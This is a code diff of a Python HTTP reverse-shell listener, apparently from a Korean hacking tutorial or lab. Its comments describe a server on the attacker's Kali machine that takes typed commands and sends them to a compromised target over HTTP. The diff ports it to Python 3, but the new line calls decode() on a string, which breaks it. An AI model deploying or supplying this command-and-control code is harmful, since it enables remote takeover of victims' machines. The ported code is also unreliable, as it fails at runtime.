@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 ## HTTP 서버를 간단히 구현할 수 있는 모듈
 
 ## Kali 리눅스 IP와 포트 지정(공격자의 IP와 포트다)
-HOST_NAME = '192.168.32.10'
+HOST_NAME = '192.168.32.254'
 PORT_NUMBER = 80
 
 ## Myhandler 클래스 시작
@@ -10,11 +10,11 @@ class MyHandler(BaseHTTPRequestHandler):
 
     ##GET 요청을 받았을때
     def do_GET(self):
-        command = raw_input("Shell >") ## 공격자 입력을 Command에 저장
+        command = input("Shell >") ## 공격자 입력을 Command에 저장
         self.send_response(200) ## 공격대상에게 200 OK를 Return 해준다
         self.send_header("Content-Type","text/html") ##Header에 Content-type을 html 형식으로 리턴
         self.end_headers() ## 헤더 끝
-        self.wfile.write(command) ## 공격자의 입력을 공격대상에게 보낸다.
+        self.wfile.write(command.decode()) ## 공격자의 입력을 공격대상에게 보낸다.
 
     ##POST 요청을 받았을때
     def do_POST(self):
@@ -30,7 +30,9 @@ if __name__ == '__main__':
     httpd = server_class(server_address,MyHandler) ## Kali 리눅스에 HTTP 서버를 구동
 
     try:
+        print("HTTP Reverse Shell is listening....")
         httpd.serve_forever() ## Ctrl+c 가 입력되기 전까지 계속 구동해라!
+
     except KeyboardInterrupt: ## Ctrl+c 가 입력되면?
         print('[!] Server is terminated') ## 서버 종료
         httpd.server_close()
